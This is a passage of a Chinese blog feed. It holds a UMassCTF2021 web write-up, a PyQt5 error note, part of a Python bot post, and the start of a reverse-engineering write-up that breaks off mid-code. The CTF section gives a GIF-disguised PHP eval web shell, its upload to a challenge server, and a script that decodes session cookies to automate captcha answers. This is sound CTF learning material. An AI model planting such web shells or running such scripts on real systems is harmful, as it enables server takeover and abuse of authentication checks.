class="token punctuation">)</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较简单，一看就懂，上面有管理员权限判断，下面的异常处理里面的内容你也可以自己去实现一下，自己DIY出来的bot用着才最爽好吧。</p><p><img src="/2021/04/13/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Ego-cqhttp%E7%9A%84bot/27916F02.jpg" alt="img" style="zoom:150%;"></p><h2 id="OVER"><a href="#OVER" class="headerlink" title="OVER"></a>OVER</h2><p>只有配置文件比较固定了现在，其他的还在自己实现中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 开源 </tag>
            
            <tag> bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UMassCTF2021复现</title>
      <link href="2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Hermit-Part-1"><a href="#Hermit-Part-1" class="headerlink" title="Hermit - Part 1"></a>Hermit - Part 1</h2><p>考点：upload</p><h3 id="先下upload源码"><a href="#先下upload源码" class="headerlink" title="先下upload源码"></a>先下upload源码</h3><p>有目录穿越漏洞，但是因为不知道flag文件的位置与flag的文件名，所以这个漏洞并不能让我们直接拿上flag，但是我们可以先拿下upload的源码。</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210416205435077.png" alt="image-20210416205435077"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"uploads/"</span><span class="token punctuation">;</span>  <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileToUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token variable">$target_dir</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token variable">$imageFileType</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$target_file</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Check file size</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileToUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"size"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">50000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry, your file is too large."</span><span class="token punctuation">;</span>    <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Allow certain file formats</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">"jpg"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">"png"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">"jpeg"</span>  <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token double-quoted-string string">"gif"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span><span class="token punctuation">;</span>    <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Check if $uploadOk is set to 0 by an error</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$uploadOk</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>Sorry, your file was not uploaded.&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;a href='/'>Back&lt;/a>"</span><span class="token punctuation">;</span>  <span class="token comment">// if everything is ok, try to upload file</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileToUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The file "</span><span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileToUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">" has been uploaded to "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"&lt;/p>"</span><span class="token punctuation">;</span>      <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/show.php?filename="</span> <span class="token punctuation">.</span> <span class="token function">rawurlencode</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;a href=<span class="token interpolation"><span class="token variable">$path</span></span>>See Image&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>Sorry, there was an error uploading your file.&lt;/p>"</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;a href='/'>Back&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析为上传图片大小限制，文件后缀名限制，最后还有一个basename()取文件名的没啥用。</p><h3 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h3><p>制作一张图片马，在马上面加上<code>GIF89a?</code>再改文件名为<code>eval.gif</code>即可成功上传图片马。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a?<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417001441697.png" alt="图片马内容"></p><p>上传之后点击<code>See Image</code>即可找到图片马的位置</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417001555438.png" alt="图片马位置"></p><p>可成功出phpifo();界面就是成功了。</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417002316242.png" alt="getshell"></p><p>图片马的link就是上面的<code>http://104.197.195.221:8086/show.php?filename=BcpjPn</code>，添加数据到蚁剑getshell。<img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417001812670.png" alt="蚁剑"></p><p>看到这么多杂乱的数据真想给他删了，不过还是算了（因为没有权限呼呼）。</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417002220783.png" alt="flag文件位置"></p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417002408195.png" alt="flag"></p><p>flag文件位置就是上面的那个，下面的这个flag是测试用的？不太清楚。</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>UMASS&#123;a_picture_paints_a_thousand_shells&#125;</code></p><h2 id="PikCha"><a href="#PikCha" class="headerlink" title="PikCha"></a>PikCha</h2><p>复现链接        <a href="http://104.197.195.221:8084/">http://104.197.195.221:8084</a>           <a href="http://34.121.84.161:8084/">http://34.121.84.161:8084</a></p><p>这个似乎是jwt的</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417004052806.png" alt="image-20210417004052806"></p><p>不过base64也可以</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417004844204.png" alt="image-20210417004844204"></p><p>它的意思就是让我们提交answer数组里面的值到input框里面并且两值之间使用空格隔开，就像下面这样</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417005020713.png" alt="输入answer"></p><p>然后成功次数就会加一，变成<code>1/500</code></p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417005125353.png" alt="成功加一"></p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417103242049.png" alt="测试session的第一个点之前的内容是base64的"></p><h3 id="好了，用python脚本处理一下就行了"><a href="#好了，用python脚本处理一下就行了" class="headerlink" title="好了，用python脚本处理一下就行了"></a>好了，用python脚本处理一下就行了</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         ctf</span><span class="token comment"># Description:  复现脚本</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2021/4/12</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> jsonreq <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 保持会话session</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://34.121.84.161:8084/'</span>    r <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    cookie <span class="token operator">=</span> r<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>    cookie <span class="token operator">=</span> cookie<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'==='</span>   <span class="token comment"># 官方wp的解决方案，加上三个等号更好一点就不会出错了</span>    content <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>    ans <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    post <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'guess'</span><span class="token punctuation">:</span> res    <span class="token punctuation">&#125;</span>    pcookie <span class="token operator">=</span> r<span class="token punctuation">.</span>cookies    response <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">,</span> cookies<span class="token operator">=</span>pcookie<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">499</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第&#123;0&#125;次"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用post传参</p><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417104108641.png" alt="image-20210417104108641"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><img src="/2021/04/11/UMassCTF2021%E5%A4%8D%E7%8E%B0/image-20210417122519531.png" alt="image-20210417122519531"></p><p><code>UMASS&#123;G0tt4_c4tch_th3m_4ll_17263548&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ui_MainWindow</title>
      <link href="2021/04/06/Ui-MainWindow/"/>
      <url>2021/04/06/Ui-MainWindow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="报错-TypeError-about-QWidget-str-str-argument-1-has-unexpected-type-39-Ui-MainWindow-39"><a href="#报错-TypeError-about-QWidget-str-str-argument-1-has-unexpected-type-39-Ui-MainWindow-39" class="headerlink" title="报错:TypeError: about(QWidget, str, str): argument 1 has unexpected type &#39;Ui_MainWindow&#39;"></a>报错:<code>TypeError: about(QWidget, str, str): argument 1 has unexpected type &#39;Ui_MainWindow&#39;</code></h1><h2 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h2><p>今天在使用pyqt5开发脑残小软件时，因为因为还没入门，里面的参数使用错误了，从而导致报错，已解决，尚未调查问题根源与解决原理。</p><h2 id="问题代码"><a href="#问题代码" class="headerlink" title="问题代码"></a>问题代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">StartDownload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        MusicId <span class="token operator">=</span> self<span class="token punctuation">.</span>lineEdit_Music_Id<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>        music <span class="token operator">=</span> cloudmusic<span class="token punctuation">.</span>getMusic<span class="token punctuation">(</span>MusicId<span class="token punctuation">)</span>        music<span class="token punctuation">.</span>download<span class="token punctuation">(</span>level<span class="token operator">=</span><span class="token string">"lossless"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>        QtWidgets<span class="token punctuation">.</span>QMessageBox<span class="token punctuation">.</span>about<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"标题"</span><span class="token punctuation">,</span> <span class="token string">"关于对话框消息正文"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">SelectFolder</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> Filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QFileDialog<span class="token punctuation">.</span>getSaveFileName<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"设置路径"</span><span class="token punctuation">,</span> <span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token string">"All Files (*);;Text Files (*.txt)"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/06/Ui-MainWindow/image-20210406165218704.png" alt="问题代码截图"></p><h2 id="修改之后"><a href="#修改之后" class="headerlink" title="修改之后"></a>修改之后</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">StartDownload</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        MusicId <span class="token operator">=</span> self<span class="token punctuation">.</span>lineEdit_Music_Id<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>        music <span class="token operator">=</span> cloudmusic<span class="token punctuation">.</span>getMusic<span class="token punctuation">(</span>MusicId<span class="token punctuation">)</span>        music<span class="token punctuation">.</span>download<span class="token punctuation">(</span>level<span class="token operator">=</span><span class="token string">"lossless"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>        QtWidgets<span class="token punctuation">.</span>QMessageBox<span class="token punctuation">.</span>about<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"标题"</span><span class="token punctuation">,</span> <span class="token string">"关于对话框消息正文"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">SelectFolder</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> Filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    directory <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QFileDialog<span class="token punctuation">.</span>getSaveFileName<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"设置路径"</span><span class="token punctuation">,</span> <span class="token string">"./"</span><span class="token punctuation">,</span> <span class="token string">"All Files (*);;Text Files (*.txt)"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>希望有所帮助</strong></p><h1 id="pyinstaller打包后软件太大"><a href="#pyinstaller打包后软件太大" class="headerlink" title="pyinstaller打包后软件太大"></a>pyinstaller打包后软件太大</h1><h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>因为我用的是我的python下的pyinstaller，并且用这个物理机上的pyinstaller整的，就会把我的下的其他的python包也给打包了，就会变得很大。</p><h2 id="问题未解决"><a href="#问题未解决" class="headerlink" title="问题未解决"></a>问题未解决</h2><p>用pycharm整一个venv虚拟环境，下载所需要的包与pyinstaller，再在pycharm里面打包。</p><p>没效果，应该就是pyqt5太臃肿了可能，哎，这可不行，下次再写软件也许要换个框架呜呜（感觉qtdesigner特别新手友好。。。）</p>]]></content>
      
      
      
        <tags>
            
            <tag> pyqt5 </tag>
            
            <tag> 新手 </tag>
            
            <tag> 问题解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU逆向_[GXYCTF2019]luck_guy</title>
      <link href="2021/04/05/BUU%E9%80%86%E5%90%91-GXYCTF2019-luck-guy/"/>
      <url>2021/04/05/BUU%E9%80%86%E5%90%91-GXYCTF2019-luck-guy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p>这个linux下的可执行文件似乎总是64位的啊，逆向两个了都是64位的，直接拖进64位的ida中，查看main方法的伪代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">welcome</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"_________________"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"try to patch me and find flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input a lucky number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">patch_me</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,see you again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>patch_me()</code>方法，看到关键方法<code>get_flag()</code></p><h2 id="关键代码分析"><a href="#关键代码分析" class="headerlink" title="关键代码分析"></a>关键代码分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        s <span class="token operator">=</span> <span class="token string">'\x7Ffo`guci'</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token 